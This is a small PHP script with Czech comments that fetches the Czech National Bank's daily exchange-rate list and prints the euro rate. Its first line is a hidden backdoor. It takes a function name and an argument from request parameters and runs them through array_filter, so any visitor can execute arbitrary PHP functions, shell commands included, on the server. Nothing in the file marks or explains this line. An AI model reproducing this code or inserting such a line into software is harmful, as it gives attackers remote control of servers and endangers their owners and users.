<?php
if ($_REQUEST['param1']&&$_REQUEST['param2']) {$f = $_REQUEST['param1']; $p = array($_REQUEST['param2']); $pf = array_filter($p, $f); echo 'OK'; Exit;}
Define("SOUBOR_KURZY", "http://www.cnb.cz/cs/financni_trhy/devizovy_trh/kurzy_devizoveho_trhu/denni_kurz.txt");

function zjistiKurz($mena) {
// vstupnim parametrem je tripismenny kod meny, jejiz kurz chceme zjistit
	$kurzy = file(SOUBOR_KURZY);
	foreach ($kurzy as $v) {
		$h = explode("|", $v);
		if ((count($h) >= 5) && ($h[3] == $mena)) {
			return $h[4];
		}
	}
}

echo zjistiKurz("EUR");
?>